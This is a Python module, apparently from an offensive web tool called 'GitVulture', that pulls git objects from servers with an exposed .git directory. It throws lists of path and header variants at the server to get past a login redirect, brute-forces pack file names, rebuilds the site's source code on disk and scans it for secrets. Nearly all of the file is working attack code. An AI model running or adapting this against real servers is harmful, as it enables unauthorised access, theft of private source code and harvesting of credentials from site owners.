"""Aggressive blob retrieval & source code reconstruction.

Once GitVulture has parsed `.git/index` we know:
  - the SHA-1 of every tracked blob
  - the file path of every tracked blob
  - the file mode

The server blocks `/.git/objects/xx/yyyy...` with a 302 redirect to
/login.php, but the SAME blob can usually be reached via dozens of
alternative URL forms (depending on the framework that does the
redirect). This module hammers each known blob with the full
bypass matrix and, for every byte we recover, attempts a zlib
decompress + git-object parse to produce real, usable source code.

It also tries the upstream-mirror trick: if `.git/config` exposed a
`github.com/<org>/<repo>` remote, raw.githubusercontent.com /
archive endpoints sometimes serve the same file even when the repo
is "private" to git clone but cached elsewhere.
"""
from __future__ import annotations

import asyncio
import re
import zlib
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

from .escalation_data import EXTREME_HEADER_BYPASS, EXTREME_PATH_BYPASS
from .http_client import HttpClient


@dataclass
class Probe:
    method: str
    url: str
    status: int = 0
    size: int = 0
    bypass: Optional[str] = None
    note: Optional[str] = None


@dataclass
class BlobHit:
    sha: str
    path: str
    bypass: str
    size: int
    decoded_size: int
    obj_type: Optional[str] = None
    saved_at: Optional[str] = None


def _decode_loose(raw: bytes) -> Optional[tuple[str, bytes]]:
    """Decompress a loose git object and return (type, payload)."""
    if not raw:
        return None
    try:
        plain = zlib.decompress(raw)
    except Exception:
        return None
    sp = plain.find(b" ")
    nul = plain.find(b"\x00")
    if sp < 0 or nul < 0 or sp > nul:
        return None
    obj_type = plain[:sp].decode("ascii", errors="replace")
    if obj_type not in ("blob", "tree", "commit", "tag"):
        return None
    return obj_type, plain[nul + 1 :]


def _build_variant_urls(target: str, sha: str) -> list[tuple[str, str]]:
    """Return list of (label, url) candidates for a single SHA."""
    base = f".git/objects/{sha[:2]}/{sha[2:]}"
    out: list[tuple[str, str]] = []
    for tmpl in EXTREME_PATH_BYPASS:
        variant = (tmpl
                   .replace("{p}", base)
                   .replace("{x}", f"objects/{sha[:2]}/{sha[2:]}")
                   .replace("{prefix}", ""))
        if not variant.startswith("/"):
            variant = "/" + variant
        out.append((f"path:{tmpl[:25]}", f"{target}{variant}"))
    # Some servers strip the /.git/ prefix when proxying
    for prefix in ("/git/", "/.git2/", "/_git/"):
        out.append((f"prefix:{prefix}", f"{target}{prefix}objects/{sha[:2]}/{sha[2:]}"))
    return out


@dataclass
class AggressiveResult:
    hits: list[BlobHit]
    files_saved: dict[str, str]   # path -> on-disk location
    failed_shas: list[str]


class AggressiveRetriever:
    def __init__(self, client: HttpClient, target: str, out_dir: Path, log=None):
        self.client = client
        self.target = target.rstrip("/")
        self.out_dir = out_dir
        self.recovered_dir = out_dir / "recovered_blobs"
        self.recovered_dir.mkdir(parents=True, exist_ok=True)
        self.source_dir = out_dir / "recovered_source"
        self.source_dir.mkdir(parents=True, exist_ok=True)
        self.log = log or (lambda *a, **kw: None)

    async def retrieve(self, blobs: list[tuple[str, str]]) -> AggressiveResult:
        """blobs: list of (sha, path)."""
        result = AggressiveResult(hits=[], files_saved={}, failed_shas=[])

        async def one(sha: str, file_path: str):
            variants = _build_variant_urls(self.target, sha)
            # 1) Direct via /.git/objects (canonical)
            for label, url in variants[:35]:
                r = await self.client._request(url)
                if r.status >= 200 and r.status < 300 and len(r.content) > 0:
                    decoded = _decode_loose(r.content)
                    if decoded:
                        obj_type, payload = decoded
                        # Save raw obj
                        raw_path = self.recovered_dir / sha
                        raw_path.write_bytes(r.content)
                        # If it's a blob, restore the actual source file
                        if obj_type == "blob":
                            safe_path = file_path.lstrip("/").replace("..", "_")
                            full = self.source_dir / safe_path
                            full.parent.mkdir(parents=True, exist_ok=True)
                            full.write_bytes(payload)
                            result.files_saved[file_path] = str(full)
                        result.hits.append(BlobHit(
                            sha=sha, path=file_path, bypass=label,
                            size=len(r.content), decoded_size=len(payload),
                            obj_type=obj_type, saved_at=str(raw_path),
                        ))
                        self.log(f"[L9] RECOVERED {file_path} via {label} ({len(payload)} bytes)")
                        return
            # 2) Try header-based bypass
            canonical_url = f"{self.target}/.git/objects/{sha[:2]}/{sha[2:]}"
            for hdr_tmpl in EXTREME_HEADER_BYPASS:
                hdr = {k: v.format(p=f".git/objects/{sha[:2]}/{sha[2:]}")
                       for k, v in hdr_tmpl.items()}
                r = await self.client._request(canonical_url, extra_headers=hdr)
                if r.status >= 200 and r.status < 300 and len(r.content) > 0:
                    decoded = _decode_loose(r.content)
                    if decoded:
                        obj_type, payload = decoded
                        raw_path = self.recovered_dir / sha
                        raw_path.write_bytes(r.content)
                        if obj_type == "blob":
                            safe_path = file_path.lstrip("/").replace("..", "_")
                            full = self.source_dir / safe_path
                            full.parent.mkdir(parents=True, exist_ok=True)
                            full.write_bytes(payload)
                            result.files_saved[file_path] = str(full)
                        result.hits.append(BlobHit(
                            sha=sha, path=file_path,
                            bypass=f"hdr:{list(hdr.keys())[0]}",
                            size=len(r.content), decoded_size=len(payload),
                            obj_type=obj_type, saved_at=str(raw_path),
                        ))
                        self.log(f"[L9] RECOVERED {file_path} via header {list(hdr.keys())[0]}")
                        return
            # 3) Try fetching the FILE PATH directly from the live web root
            # (sometimes the project file is served at https://target/<path>)
            for direct in (f"{self.target}/{file_path}",
                           f"{self.target}/api/{file_path}",
                           f"{self.target}/public/{file_path}"):
                r = await self.client._request(direct)
                if (r.status == 200 and len(r.content) > 0
                        and not r.content[:200].lower().startswith(b"<!doctype")):
                    safe_path = file_path.lstrip("/").replace("..", "_")
                    full = self.source_dir / safe_path
                    full.parent.mkdir(parents=True, exist_ok=True)
                    full.write_bytes(r.content)
                    result.files_saved[file_path] = str(full)
                    result.hits.append(BlobHit(
                        sha=sha, path=file_path, bypass="direct-webroot",
                        size=len(r.content), decoded_size=len(r.content),
                        obj_type="blob-direct", saved_at=str(full),
                    ))
                    self.log(f"[L9] DIRECT WEBROOT served {file_path}")
                    return
            result.failed_shas.append(sha)

        CHUNK = 6
        for i in range(0, len(blobs), CHUNK):
            await asyncio.gather(*(one(sha, p) for sha, p in blobs[i : i + CHUNK]),
                                  return_exceptions=True)
        return result


# ---------------------------------------------------------------------- #
# Pack-file brute
# ---------------------------------------------------------------------- #
async def hunt_pack_files(client: HttpClient, target: str, known_shas: list[str],
                          out_dir: Path, log=None) -> list[Probe]:
    """Try a list of pack-* names. Many servers expose .pack but block loose."""
    log = log or (lambda *a, **kw: None)
    candidates: list[str] = []
    # 1) Use the first-N hex chars of every known commit/tree SHA — sometimes
    #    pack-<sha>.pack matches one of these.
    for sha in known_shas[:30]:
        candidates.append(f"pack-{sha}.pack")
        candidates.append(f"pack-{sha}.idx")
    # 2) Lowercase / classic packs
    for name in ("pack-default.pack", "pack-master.pack", "pack-main.pack"):
        candidates.append(name)
    probes: list[Probe] = []
    pack_dir = out_dir / ".git" / "objects" / "pack"
    pack_dir.mkdir(parents=True, exist_ok=True)

    async def one(name: str):
        url = f"{target.rstrip('/')}/.git/objects/pack/{name}"
        r = await client._request(url)
        p = Probe(method="GET", url=url, status=r.status, size=len(r.content),
                   bypass="pack-brute")
        probes.append(p)
        if 200 <= r.status < 300 and len(r.content) > 64:
            (pack_dir / name).write_bytes(r.content)
            log(f"[L10] pack HIT {name} ({len(r.content)} bytes)")
    await asyncio.gather(*(one(c) for c in candidates), return_exceptions=True)
    return probes


# ---------------------------------------------------------------------- #
# Recovered-source secret super-scan
# ---------------------------------------------------------------------- #
def scan_recovered_sources(source_dir: Path) -> list[dict]:
    """Walk the recovered_source tree and scan every file with the full secret rules."""
    from ..secrets.patterns import scan_text
    findings: list[dict] = []
    if not source_dir.exists():
        return findings
    for p in source_dir.rglob("*"):
        if not p.is_file() or p.stat().st_size > 2_000_000:
            continue
        try:
            text = p.read_text(encoding="utf-8", errors="replace")
        except Exception:
            continue
        rel = str(p.relative_to(source_dir))
        for f in scan_text(text, file_path=rel, source="L9-recovered-source"):
            findings.append({
                "rule_id": f.rule_id, "severity": f.severity,
                "description": f.description, "match": f.match,
                "redacted": f.redacted, "line": f.line, "line_no": f.line_no,
                "file_path": rel, "commit_sha": None, "source": "L9-recovered-source",
                "extra": {},
            })
    return findings
